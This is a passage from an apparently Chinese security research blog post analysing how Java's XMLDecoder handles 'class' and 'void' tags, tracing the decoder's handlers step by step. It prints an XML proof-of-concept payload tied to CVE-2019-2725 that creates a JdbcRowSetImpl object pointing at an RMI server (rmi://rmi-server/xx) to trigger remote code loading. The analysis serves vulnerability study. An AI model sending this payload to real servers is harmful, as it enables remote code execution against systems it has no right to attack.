标签后面一定要添加<code>void</code>标签呢？如果去掉后面的 void 标签，直接跟其他标签行不行？上面的 xml 好理解，如果将 void 标签去掉，那么这些 string 标签中的字符就会直接拼接在一起了，导致成如下这样</p><img src="/2023/08/30/XMLDecoder-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-class-%E6%A0%87%E7%AD%BE/9.png" class=""><p>那么如果是下面这个 xml 呢？这个也是<code>CVE-2019-2725</code>中用到的一个 poc </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">java</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">class</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>com.sun.rowset.JdbcRowSetImpl<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">void</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;dataSourceName&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>rmi://rmi-server/xx<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;autoCommit&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">boolean</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">boolean</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">void</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">class</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">java</span>&gt;</span><br></code></pre></td></tr></table></figure><p>如果将 void 标签去掉，后面直接跟 property 标签呢，这样也杜绝了找不到类的问题</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">java</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">class</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>com.sun.rowset.JdbcRowSetImpl<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;dataSourceName&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>rmi://rmi-server/xx<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;autoCommit&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">boolean</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">boolean</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">class</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">java</span>&gt;</span><br></code></pre></td></tr></table></figure><p>结果会报如下错误，简单来说就是在类中找不到 property 标签指定的方法</p><img src="/2023/08/30/XMLDecoder-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-class-%E6%A0%87%E7%AD%BE/10.png" class=""><p>我们来跟踪调试一下</p><p>在解析 property 标签中的第一个 string 闭合标签时先进入<code>com.sun.beans.decoder.ElementHandler#endElement</code>方法</p><img src="/2023/08/30/XMLDecoder-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-class-%E6%A0%87%E7%AD%BE/11.png" class=""><p>继续往下跟进，进入<code>com.sun.beans.decoder.PropertyElementHandler#setValue</code>方法中，在这里要先调用<code>getContextBean</code>方法，来获取 property 父标签的 value</p><img src="/2023/08/30/XMLDecoder-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-class-%E6%A0%87%E7%AD%BE/12.png" class=""><p>先跟进<code>com.sun.beans.decoder.ElementHandler#getContextBean</code></p><img src="/2023/08/30/XMLDecoder-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-class-%E6%A0%87%E7%AD%BE/13.png" class=""><p>这里会调用<code>com.sun.beans.decoder.StringElementHandler#getValueObject</code>，因为 ClassElementHandler 没有这个方法，所以会调用其父类 StringElementHandler 的 getValueObject 方法，在这里面先调用<code>com.sun.beans.decoder.StringElementHandler#getValue</code>方法查找类，然后返回 this.value </p><img src="/2023/08/30/XMLDecoder-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-class-%E6%A0%87%E7%AD%BE/14.png" class=""><p>然后回到 getContextBean 方法中，返回 value 值</p><img src="/2023/08/30/XMLDecoder-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-class-%E6%A0%87%E7%AD%BE/15.png" class=""><p>然后来到<code>com.sun.beans.decoder.PropertyElementHandler#setPropertyValue</code>方法，在<code>getContextBean</code>方法中返回的是个 Class 实例，并不是 JdbcRowSetImpl 类的实例，那么这里再 getClass 获取到的自然就是<code>java.lang.Class</code></p><img src="/2023/08/30/XMLDecoder-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-class-%E6%A0%87%E7%AD%BE/16.png" class=""><p>跟进<code>com.sun.beans.decoder.PropertyElementHandler#findSetter</code>方法，该方法就是用来查找指定类与 property 标签中 name 属性值对应的 setter 方法</p><img src="/2023/08/30/XMLDecoder-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-class-%E6%A0%87%E7%AD%BE/17.png" class=""><p>通过<code>com.sun.beans.decoder.PropertyElementHandler#getProperty</code>方法来进行搜索，这里传入的是<code>java.lang.Class</code>自然不可能查找到<code>setDataSourceName</code>方法</p><img src="/2023/08/30/XMLDecoder-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-class-%E6%A0%87%E7%AD%BE/18.png" class=""><p>那为什么添加 void 标签后就可以呢，原因在于<code>getValueObject</code>方法的不同，添加后这里 property 标签的父标签就变成了 void</p><img src="/2023/08/30/XMLDecoder-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-class-%E6%A0%87%E7%AD%BE/19.png" class=""><p>VoidElementHandler 类没有<code>getValueObject</code>方法，所以会调用其间接父类 NewElementHandler 的无参 <code>getValueObject</code>方法，然后在这里又会调用到其直接父类 ObjectElementHandler 的 getValueObject 方法</p><img src="/2023/08/30/XMLDecoder-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-class-%E6%A0%87%E7%AD%BE/20.png" class=""><p>在<code>com.sun.beans.decoder.ObjectElementHandler#getValueObject</code>方法中也是先调用<code>com.sun.beans.decoder.NewElementHandler#getContextBean</code>方法</p><img src="/2023/08/30/XMLDecoder-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-class-%E6%A0%87%E7%AD%BE/21.png" class=""><p>但是在该方法的下面会通过反射 new 一个 JdbcRowSetImpl 实例</p><img src="/2023/08/30/XMLDecoder-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-class-%E6%A0%87%E7%AD%BE/22.png" class=""><p>此时在<code>com.sun.beans.decoder.PropertyElementHandler#setPropertyValue</code>方法中 getClass 获得的就是<code>com.sun.rowset.JdbcRowSetImpl</code>类而不是<code>java.lang.Class</code>了</p><img src="/2023/08/30/XMLDecoder-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-class-%E6%A0%87%E7%AD%BE/23.png" class="">]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
